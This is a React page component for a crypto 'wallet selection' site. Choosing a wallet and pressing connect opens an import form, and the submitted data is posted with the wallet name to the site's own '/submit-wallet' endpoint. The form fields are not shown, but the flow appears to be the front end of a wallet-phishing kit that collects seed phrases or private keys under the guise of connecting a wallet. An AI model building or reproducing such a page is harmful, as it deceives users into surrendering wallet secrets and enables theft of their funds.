// src/pages/WalletSelection.jsx
import React, { useState } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import Navbar from '../components/Navbar';
import WalletGrid from '../components/WalletGrid';
import WalletModal from '../components/WalletModal';
import ImportModal from '../components/ImportModal';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api';

const WalletSelection = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const category = searchParams.get('category') || 'secure';

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showImportModal, setShowImportModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setShowWalletModal(true);
  };

  const handleConnect = () => {
    setShowWalletModal(false);
    setShowImportModal(true);
  };

  const handleImportSubmit = async (data) => {
    setIsSubmitting(true);

    try {
      const response = await fetch(`${API_URL}/submit-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...data,
          wallet: selectedWallet.name,
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || 'Submission failed');
      }

      setShowImportModal(false);
      navigate('/success');
    } catch (error) {
      console.error('Submission error:', error);
      throw error;
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900">
      <Navbar />

      <main className="w-full">
        <WalletGrid
          category={category}
          onWalletSelect={handleWalletSelect}
        />
      </main>

      {/* Wallet Info Modal */}
      <WalletModal
        wallet={selectedWallet}
        isOpen={showWalletModal}
        onClose={() => {
          setShowWalletModal(false);
          setSelectedWallet(null);
        }}
        onConnect={handleConnect}
      />

      {/* Import Form Modal */}
      <ImportModal
        wallet={selectedWallet}
        isOpen={showImportModal}
        onClose={() => {
          setShowImportModal(false);
          setShowWalletModal(false);
          setSelectedWallet(null);
        }}
        onSubmit={handleImportSubmit}
      />

      {/* Loading Overlay */}
      {isSubmitting && (
        <div className="fixed inset-0 bg-black/70 z-[999] flex items-center justify-center">
          <div className="bg-white rounded-lg p-8 text-center">
            <div className="w-12 h-12 border-4 border-gray-300 border-t-blue-600 rounded-full animate-spin mx-auto mb-4" />
            <p className="text-gray-900 font-semibold">Processing your submission...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default WalletSelection;